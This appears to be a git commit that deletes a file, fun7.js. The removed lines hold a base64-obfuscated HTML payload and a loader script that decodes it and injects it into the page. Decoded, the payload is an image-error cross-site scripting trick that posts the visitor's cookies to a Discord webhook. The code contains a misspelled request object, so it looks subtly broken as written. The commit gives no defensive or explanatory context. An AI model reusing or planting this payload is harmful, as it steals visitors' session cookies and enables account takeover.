343b445cebbd100e25109c9ee9afcf332d2d9d33
wfaderfuiydglaefhioprefoptuy80 <auttpoperationamalgamation29@gmail.com>
2024-08-19 23:45:42 -0400

    Delete fun7.js

--- fun7.js
+++
@@ -1,8 +0,0 @@
-<div data-payload="PGltZyBzcmM9eCBvbmVycm9yPSdsZXQgeGhyID0gbmV3IFh0bWxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjc1Mjk1NTI5NzU2MDA0NDI2L0k0ZWZLUUY4dUlJQVJsSDM3T3RkY0tlcmR2LUZnSkY5cmFITlV2NXMtbjB6LXVEcTdrLVY4X1lYQzg1MU15VWd6OGxkJyk7IHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpOyB4aHIuc2VuZChKU09OLnN0cmluZ2lmeSh7Y29udGVudDogZG9jdW1lbnQuY29va2llfSkpOyc+CjwvaW1nPg="></div>
-<script>
-  const payload = document.querySelector('[data-payload]').getAttribute('data-payload');
-  const decodedPayload = atob(payload);
-  const script = document.createElement('script');
-  script.textContent = decodedPayload.substring(decodedPayload.indexOf('onerror=') + 8, decodedPayload.lastIndexOf('"'));
-  document.body.appendChild(script);
-</script>
